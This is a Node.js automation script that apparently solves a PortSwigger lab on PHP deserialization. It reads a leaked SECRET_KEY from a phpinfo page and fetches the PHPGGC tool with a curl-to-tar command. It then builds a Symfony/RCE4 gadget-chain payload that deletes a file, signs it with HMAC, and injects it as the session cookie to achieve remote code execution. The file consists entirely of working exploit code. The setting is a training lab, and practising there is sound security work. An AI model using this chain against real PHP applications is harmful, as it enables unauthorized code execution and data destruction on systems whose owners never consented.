const crypto = require('crypto');
const { execSync } = require('child_process');

const { labLogin, runLab } = require('./_common.cjs');

const TITLE = 'Exploiting PHP deserialization with a pre-built gadget chain';
const PATH = '/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain';
const PHPGGC_DIR = '/tmp/phpggc-master';

function ensurePhpGgc() {
  execSync(`test -d "${PHPGGC_DIR}" || curl -fsSL https://github.com/ambionics/phpggc/archive/refs/heads/master.tar.gz | tar xz -C /tmp`, {
    stdio: 'pipe',
    shell: '/bin/bash',
  });
}

function generatePayloadBase64() {
  return execSync(
    `docker run --rm -v "${PHPGGC_DIR}":/app -w /app php:8.2-cli php ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0`,
    {
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
      shell: '/bin/bash',
    },
  ).trim();
}

function buildSignedCookie(token, secretKey) {
  const signature = crypto.createHmac('sha1', secretKey).update(token).digest('hex');
  return encodeURIComponent(JSON.stringify({ token, sig_hmac_sha1: signature }));
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ context, page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');

    await page.goto(labUrl + '/cgi-bin/phpinfo.php', { waitUntil: 'domcontentloaded', timeout: 15000 });
    const body = await page.textContent('body');
    const match = body && body.match(/SECRET_KEY\s+([^\s]+)/i);
    if (!match) {
      throw new Error('SECRET_KEY not found in phpinfo output');
    }
    const secretKey = match[1].trim();

    ensurePhpGgc();
    const token = generatePayloadBase64();
    const cookieValue = buildSignedCookie(token, secretKey);

    const cookies = await context.cookies(labUrl);
    const sessionCookie = cookies.find((cookie) => /session/i.test(cookie.name)) || cookies[0];
    if (!sessionCookie) {
      throw new Error('Session cookie not found');
    }

    await context.addCookies([
      {
        name: sessionCookie.name,
        value: cookieValue,
        domain: sessionCookie.domain,
        path: sessionCookie.path,
        httpOnly: sessionCookie.httpOnly,
        secure: sessionCookie.secure,
        sameSite: sessionCookie.sameSite,
        expires: sessionCookie.expires,
      },
    ]);

    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    await page.waitForTimeout(2000);
  },
});
